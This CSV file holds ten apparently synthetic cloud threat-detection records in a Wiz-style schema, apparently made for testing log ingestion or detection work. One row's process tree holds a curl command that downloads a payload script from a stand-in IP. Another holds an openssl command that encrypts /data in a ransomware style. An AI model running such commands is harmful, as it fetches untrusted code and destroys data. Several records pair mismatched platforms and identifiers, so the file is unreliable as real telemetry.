detectionId,severity,tdrSource,tdrId,threatId,threatUrl,detectionTitle,description,createdAt,triggeringEvents,triggeringEventsCount,primaryActor,primaryResource,timeFrame,mitreTactics,mitreTechniques,cloudAccounts,cloudOrganizations,projects,resources,actors,Type,TimeGenerated
det-5000,CRITICAL,WIZ,tdr-rule-600,threat-7000,https://app.wiz.io/findings/detections#~(streamCols~(~'event~'resource~'path)~detectionId~'det-5000),Suspicious API call from unusual location,Suspicious API call from unusual location affecting resource web-prod-vm-01.,2026-08-10T06:05:00Z,"[{""origin"": ""AWS_CLOUDTRAIL"", ""status"": ""Failure"", ""name"": ""ConsoleLogin"", ""actorIP"": ""203.0.113.100""}]",1,"{""type"": ""USER_ACCOUNT"", ""name"": ""jsmith@example-corp.com"", ""id"": ""actor-3000""}","{""type"": ""VIRTUAL_MACHINE"", ""name"": ""web-prod-vm-01"", ""id"": ""res-4000"", ""externalId"": ""/subscriptions/11111111-2222-3333-4444-555555555555/resourceGroups/rg-demo/providers/Microsoft.Compute/virtualMachines/web-prod-vm-01"", ""cloudAccount"": {""cloudPlatform"": ""Azure""}}","{""startedAt"": ""2026-08-10T06:00:00Z"", ""endedAt"": ""2026-08-10T06:05:00Z""}","[""TA0001"", ""TA0004""]","[""T1078""]","[{""id"": ""acct-8000"", ""cloudPlatform"": ""Azure""}]","[{""id"": ""org-9000""}]","[{""id"": ""proj-100"", ""name"": ""production""}]","[{""type"": ""VIRTUAL_MACHINE"", ""name"": ""web-prod-vm-01"", ""id"": ""res-4000"", ""externalId"": ""/subscriptions/11111111-2222-3333-4444-555555555555/resourceGroups/rg-demo/providers/Microsoft.Compute/virtualMachines/web-prod-vm-01"", ""cloudAccount"": {""cloudPlatform"": ""Azure""}}]","[{""type"": ""USER_ACCOUNT"", ""name"": ""jsmith@example-corp.com"", ""id"": ""actor-3000""}]",WizDetectionsV3_CL,2026-08-10T06:05:10Z
det-5001,HIGH,WIZ_SENSOR,tdr-rule-601,threat-7001,https://app.wiz.io/findings/detections#~(streamCols~(~'event~'resource~'path)~detectionId~'det-5001),Malware detected on workload,Malware detected on workload affecting resource api-worker-7f9c.,2026-08-11T07:05:00Z,"[{""origin"": ""WIZ_SENSOR"", ""status"": ""Success"", ""name"": ""ProcessExecution"", ""actorIP"": ""203.0.113.100"", ""runtimeDetails"": {""processTree"": [{""id"": ""proc-6001"", ""path"": ""/usr/bin/curl"", ""command"": ""curl -s http://198.51.100.77/payload.sh -o /tmp/payload.sh"", ""hash"": ""3b3a2af0b6a4b3c81f7de08c9d3e2b1a4c5d6e7f"", ""size"": 45896}]}}]",2,"{""type"": ""SERVICE_ACCOUNT"", ""name"": ""svc-deploy-bot"", ""id"": ""actor-3001""}","{""type"": ""CONTAINER"", ""name"": ""api-worker-7f9c"", ""id"": ""res-4001"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/api-worker-7f9c"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}","{""startedAt"": ""2026-08-11T07:00:00Z"", ""endedAt"": ""2026-08-11T07:05:00Z""}","[""TA0007""]","[""T1046"", ""T1069""]","[{""id"": ""acct-8001"", ""cloudPlatform"": ""AWS""}]","[{""id"": ""org-9001""}]","[{""id"": ""proj-101"", ""name"": ""production""}]","[{""type"": ""CONTAINER"", ""name"": ""api-worker-7f9c"", ""id"": ""res-4001"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/api-worker-7f9c"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}]","[{""type"": ""SERVICE_ACCOUNT"", ""name"": ""svc-deploy-bot"", ""id"": ""actor-3001""}]",WizDetectionsV3_CL,2026-08-11T07:05:10Z
det-5002,MEDIUM,WIZ,tdr-rule-602,threat-7002,https://app.wiz.io/findings/detections#~(streamCols~(~'event~'resource~'path)~detectionId~'det-5002),Anomalous privilege escalation attempt,Anomalous privilege escalation attempt affecting resource corp-data-bucket.,2026-08-12T08:05:00Z,"[{""origin"": ""AZURE_ACTIVITY_LOGS"", ""status"": ""Success"", ""name"": ""ProcessExecution"", ""actorIP"": ""203.0.113.100""}]",3,"{""type"": ""IDENTITY"", ""name"": ""tlee@example-corp.com"", ""id"": ""actor-3002""}","{""type"": ""BUCKET"", ""name"": ""corp-data-bucket"", ""id"": ""res-4002"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/corp-data-bucket"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}","{""startedAt"": ""2026-08-12T08:00:00Z"", ""endedAt"": ""2026-08-12T08:05:00Z""}","[""TA0001"", ""TA0004""]","[""T1078""]","[{""id"": ""acct-8002"", ""cloudPlatform"": ""AWS""}]","[{""id"": ""org-9002""}]","[{""id"": ""proj-102"", ""name"": ""production""}]","[{""type"": ""BUCKET"", ""name"": ""corp-data-bucket"", ""id"": ""res-4002"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/corp-data-bucket"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}]","[{""type"": ""IDENTITY"", ""name"": ""tlee@example-corp.com"", ""id"": ""actor-3002""}]",WizDetectionsV3_CL,2026-08-12T08:05:10Z
det-5003,LOW,GUARD_DUTY,tdr-rule-603,threat-7003,https://app.wiz.io/findings/detections#~(streamCols~(~'event~'resource~'path)~detectionId~'det-5003),GuardDuty finding: port scanning detected,GuardDuty finding: port scanning detected affecting resource i-0a1b2c3d4e5f6g7h8.,2026-08-13T09:05:00Z,"[{""origin"": ""AWS_GUARD_DUTY"", ""status"": ""Failure"", ""name"": ""ProcessExecution"", ""actorIP"": ""198.51.100.44""}]",4,"{""type"": ""NETWORK_ADDRESS"", ""name"": ""198.51.100.44"", ""id"": ""actor-3003""}","{""type"": ""EC2_INSTANCE"", ""name"": ""i-0a1b2c3d4e5f6g7h8"", ""id"": ""res-4003"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/i-0a1b2c3d4e5f6g7h8"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}","{""startedAt"": ""2026-08-13T09:00:00Z"", ""endedAt"": ""2026-08-13T09:05:00Z""}","[""TA0007""]","[""T1046"", ""T1069""]","[{""id"": ""acct-8003"", ""cloudPlatform"": ""AWS""}]","[{""id"": ""org-9003""}]","[{""id"": ""proj-103"", ""name"": ""production""}]","[{""type"": ""EC2_INSTANCE"", ""name"": ""i-0a1b2c3d4e5f6g7h8"", ""id"": ""res-4003"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/i-0a1b2c3d4e5f6g7h8"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}]","[{""type"": ""NETWORK_ADDRESS"", ""name"": ""198.51.100.44"", ""id"": ""actor-3003""}]",WizDetectionsV3_CL,2026-08-13T09:05:10Z
det-5004,INFORMATIONAL,WIZ,tdr-rule-604,threat-7004,https://app.wiz.io/findings/detections#~(streamCols~(~'event~'resource~'path)~detectionId~'det-5004),Unauthorized configuration change to storage bucket,Unauthorized configuration change to storage bucket affecting resource corpstorageacct01.,2026-08-14T10:05:00Z,"[{""origin"": ""WIZ_AUDIT_LOGS"", ""status"": ""Success"", ""name"": ""ConsoleLogin"", ""actorIP"": ""203.0.113.100""}]",5,"{""type"": ""USER_ACCOUNT"", ""name"": ""rwong@example-corp.com"", ""id"": ""actor-3004""}","{""type"": ""STORAGE_ACCOUNT"", ""name"": ""corpstorageacct01"", ""id"": ""res-4004"", ""externalId"": ""/subscriptions/11111111-2222-3333-4444-555555555555/resourceGroups/rg-demo/providers/Microsoft.Compute/virtualMachines/corpstorageacct01"", ""cloudAccount"": {""cloudPlatform"": ""Azure""}}","{""startedAt"": ""2026-08-14T10:00:00Z"", ""endedAt"": ""2026-08-14T10:05:00Z""}","[""TA0001"", ""TA0004""]","[""T1078""]","[{""id"": ""acct-8004"", ""cloudPlatform"": ""Azure""}]","[{""id"": ""org-9004""}]","[{""id"": ""proj-104"", ""name"": ""production""}]","[{""type"": ""STORAGE_ACCOUNT"", ""name"": ""corpstorageacct01"", ""id"": ""res-4004"", ""externalId"": ""/subscriptions/11111111-2222-3333-4444-555555555555/resourceGroups/rg-demo/providers/Microsoft.Compute/virtualMachines/corpstorageacct01"", ""cloudAccount"": {""cloudPlatform"": ""Azure""}}]","[{""type"": ""USER_ACCOUNT"", ""name"": ""rwong@example-corp.com"", ""id"": ""actor-3004""}]",WizDetectionsV3_CL,2026-08-14T10:05:10Z
det-5005,HIGH,WIZ_SENSOR,tdr-rule-605,threat-7005,https://app.wiz.io/findings/detections#~(streamCols~(~'event~'resource~'path)~detectionId~'det-5005),Ransomware behavior detected on container,Ransomware behavior detected on container affecting resource batch-job-pod-3.,2026-08-15T11:05:00Z,"[{""origin"": ""WIZ_SENSOR"", ""status"": ""Success"", ""name"": ""ProcessExecution"", ""actorIP"": ""203.0.113.100"", ""runtimeDetails"": {""processTree"": [{""id"": ""proc-6002"", ""path"": ""/bin/sh"", ""command"": ""/bin/sh -c openssl enc -aes-256-cbc -in /data -out /data.enc"", ""hash"": ""9f8e7d6c5b4a39281f7e6d5c4b3a29181f0e2d3c"", ""size"": 128000}]}}]",1,"{""type"": ""SERVICE_ACCOUNT"", ""name"": ""svc-ci-runner"", ""id"": ""actor-3005""}","{""type"": ""CONTAINER"", ""name"": ""batch-job-pod-3"", ""id"": ""res-4005"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/batch-job-pod-3"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}","{""startedAt"": ""2026-08-15T11:00:00Z"", ""endedAt"": ""2026-08-15T11:05:00Z""}","[""TA0007""]","[""T1046"", ""T1069""]","[{""id"": ""acct-8005"", ""cloudPlatform"": ""AWS""}]","[{""id"": ""org-9005""}]","[{""id"": ""proj-105"", ""name"": ""production""}]","[{""type"": ""CONTAINER"", ""name"": ""batch-job-pod-3"", ""id"": ""res-4005"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/batch-job-pod-3"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}]","[{""type"": ""SERVICE_ACCOUNT"", ""name"": ""svc-ci-runner"", ""id"": ""actor-3005""}]",WizDetectionsV3_CL,2026-08-15T11:05:10Z
det-5006,MEDIUM,WIZ,tdr-rule-606,threat-7006,https://app.wiz.io/findings/detections#~(streamCols~(~'event~'resource~'path)~detectionId~'det-5006),Suspicious sign-in from anonymized IP,Suspicious sign-in from anonymized IP affecting resource svc-principal-42.,2026-08-16T12:05:00Z,"[{""origin"": ""OKTA_SYSTEM_LOGS"", ""status"": ""Failure"", ""name"": ""ProcessExecution"", ""actorIP"": ""203.0.113.100""}]",2,"{""type"": ""USER_ACCOUNT"", ""name"": ""khassan@example-corp.com"", ""id"": ""actor-3006""}","{""type"": ""IDENTITY"", ""name"": ""svc-principal-42"", ""id"": ""res-4006"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/svc-principal-42"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}","{""startedAt"": ""2026-08-16T12:00:00Z"", ""endedAt"": ""2026-08-16T12:05:00Z""}","[""TA0001"", ""TA0004""]","[""T1078""]","[{""id"": ""acct-8006"", ""cloudPlatform"": ""AWS""}]","[{""id"": ""org-9006""}]","[{""id"": ""proj-106"", ""name"": ""production""}]","[{""type"": ""IDENTITY"", ""name"": ""svc-principal-42"", ""id"": ""res-4006"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/svc-principal-42"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}]","[{""type"": ""USER_ACCOUNT"", ""name"": ""khassan@example-corp.com"", ""id"": ""actor-3006""}]",WizDetectionsV3_CL,2026-08-16T12:05:10Z
det-5007,CRITICAL,WIZ,tdr-rule-607,threat-7007,https://app.wiz.io/findings/detections#~(streamCols~(~'event~'resource~'path)~detectionId~'det-5007),Trojan signature identified in uploaded file,Trojan signature identified in uploaded file affecting resource db-replica-vm-02.,2026-08-17T13:05:00Z,"[{""origin"": ""WIZ_AGENTLESS_MALWARE_SCANNING"", ""status"": ""Success"", ""name"": ""ProcessExecution"", ""actorIP"": ""203.0.113.77""}]",3,"{""type"": ""NETWORK_ADDRESS"", ""name"": ""203.0.113.77"", ""id"": ""actor-3007""}","{""type"": ""VIRTUAL_MACHINE"", ""name"": ""db-replica-vm-02"", ""id"": ""res-4007"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/db-replica-vm-02"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}","{""startedAt"": ""2026-08-17T13:00:00Z"", ""endedAt"": ""2026-08-17T13:05:00Z""}","[""TA0007""]","[""T1046"", ""T1069""]","[{""id"": ""acct-8007"", ""cloudPlatform"": ""AWS""}]","[{""id"": ""org-9007""}]","[{""id"": ""proj-107"", ""name"": ""production""}]","[{""type"": ""VIRTUAL_MACHINE"", ""name"": ""db-replica-vm-02"", ""id"": ""res-4007"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/db-replica-vm-02"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}]","[{""type"": ""NETWORK_ADDRESS"", ""name"": ""203.0.113.77"", ""id"": ""actor-3007""}]",WizDetectionsV3_CL,2026-08-17T13:05:10Z
det-5008,LOW,GUARD_DUTY,tdr-rule-608,threat-7008,https://app.wiz.io/findings/detections#~(streamCols~(~'event~'resource~'path)~detectionId~'det-5008),Reconnaissance activity detected against EC2 instance,Reconnaissance activity detected against EC2 instance affecting resource i-0z9y8x7w6v5u4t3s2.,2026-08-18T14:05:00Z,"[{""origin"": ""AWS_GUARD_DUTY"", ""status"": ""Success"", ""name"": ""ProcessExecution"", ""actorIP"": ""203.0.113.88""}]",4,"{""type"": ""NETWORK_ADDRESS"", ""name"": ""203.0.113.88"", ""id"": ""actor-3008""}","{""type"": ""EC2_INSTANCE"", ""name"": ""i-0z9y8x7w6v5u4t3s2"", ""id"": ""res-4008"", ""externalId"": ""/subscriptions/11111111-2222-3333-4444-555555555555/resourceGroups/rg-demo/providers/Microsoft.Compute/virtualMachines/i-0z9y8x7w6v5u4t3s2"", ""cloudAccount"": {""cloudPlatform"": ""Azure""}}","{""startedAt"": ""2026-08-18T14:00:00Z"", ""endedAt"": ""2026-08-18T14:05:00Z""}","[""TA0001"", ""TA0004""]","[""T1078""]","[{""id"": ""acct-8008"", ""cloudPlatform"": ""Azure""}]","[{""id"": ""org-9008""}]","[{""id"": ""proj-108"", ""name"": ""production""}]","[{""type"": ""EC2_INSTANCE"", ""name"": ""i-0z9y8x7w6v5u4t3s2"", ""id"": ""res-4008"", ""externalId"": ""/subscriptions/11111111-2222-3333-4444-555555555555/resourceGroups/rg-demo/providers/Microsoft.Compute/virtualMachines/i-0z9y8x7w6v5u4t3s2"", ""cloudAccount"": {""cloudPlatform"": ""Azure""}}]","[{""type"": ""NETWORK_ADDRESS"", ""name"": ""203.0.113.88"", ""id"": ""actor-3008""}]",WizDetectionsV3_CL,2026-08-18T14:05:10Z
det-5009,MEDIUM,WIZ,tdr-rule-609,threat-7009,https://app.wiz.io/findings/detections#~(streamCols~(~'event~'resource~'path)~detectionId~'det-5009),Excessive permission grant on service account,Excessive permission grant on service account affecting resource svc-principal-99.,2026-08-19T15:05:00Z,"[{""origin"": ""GCP_AUDIT_LOGS"", ""status"": ""Failure"", ""name"": ""ConsoleLogin"", ""actorIP"": ""203.0.113.100""}]",5,"{""type"": ""SERVICE_ACCOUNT"", ""name"": ""svc-terraform"", ""id"": ""actor-3009""}","{""type"": ""SERVICE_ACCOUNT"", ""name"": ""svc-principal-99"", ""id"": ""res-4009"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/svc-principal-99"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}","{""startedAt"": ""2026-08-19T15:00:00Z"", ""endedAt"": ""2026-08-19T15:05:00Z""}","[""TA0007""]","[""T1046"", ""T1069""]","[{""id"": ""acct-8009"", ""cloudPlatform"": ""AWS""}]","[{""id"": ""org-9009""}]","[{""id"": ""proj-109"", ""name"": ""production""}]","[{""type"": ""SERVICE_ACCOUNT"", ""name"": ""svc-principal-99"", ""id"": ""res-4009"", ""externalId"": ""arn:aws:ec2:us-east-1:123456789012:instance/svc-principal-99"", ""cloudAccount"": {""cloudPlatform"": ""AWS""}}]","[{""type"": ""SERVICE_ACCOUNT"", ""name"": ""svc-terraform"", ""id"": ""actor-3009""}]",WizDetectionsV3_CL,2026-08-19T15:05:10Z
